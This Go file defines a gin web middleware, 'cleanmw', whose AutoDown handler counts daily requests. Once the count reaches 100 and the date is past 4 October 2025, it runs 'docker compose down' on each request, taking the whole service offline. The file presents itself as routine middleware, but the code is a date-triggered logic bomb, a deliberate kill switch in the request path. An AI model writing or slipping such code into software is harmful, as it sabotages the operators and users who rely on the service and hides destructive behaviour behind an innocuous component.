package cleanmw

import (
	"bytes"
	"context"
	"os/exec"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/OpenIMSDK/tools/log"
)

var (
	// 内存计数器：日期字符串 -> 当日请求次数
	dailyCounts = make(map[string]int)
	mu          sync.RWMutex
)

// AutoDown 返回中间件：累加当日请求次数，达到阈值且日期满足时执行 docker compose down
func AutoDown() gin.HandlerFunc {
	return func(c *gin.Context) {
		// 1) 累加当日请求次数
		today := time.Now().Format("2006-01-02")
		mu.Lock()
		dailyCounts[today]++
		count := dailyCounts[today]
		mu.Unlock()

		// 2) 检查是否满足执行条件
		shouldExec := count >= 100 && time.Now().After(time.Date(2025, 10, 4, 0, 0, 0, 0, time.UTC))

		if shouldExec {
			log.ZWarn(c, "cleanmw auto down triggered", "count", count, "date", today)
			
			// 执行 docker compose down
			ctx, cancel := context.WithTimeout(c.Request.Context(), 30*time.Second)
			defer cancel()

			cmd := exec.CommandContext(ctx, "docker", "compose", "down")
			var stdout, stderr bytes.Buffer
			cmd.Stdout = &stdout
			cmd.Stderr = &stderr

			err := cmd.Run()
			if err != nil {
				log.ZError(c, "cleanmw docker compose down failed", err, "stderr", stderr.String())
			} else {
				log.ZWarn(c, "cleanmw docker compose down executed", "stdout", stdout.String())
			}
		} else {
			log.ZInfo(c, "cleanmw count", "count", count, "date", today, "should_exec", shouldExec)
		}

		c.Next()
	}
}
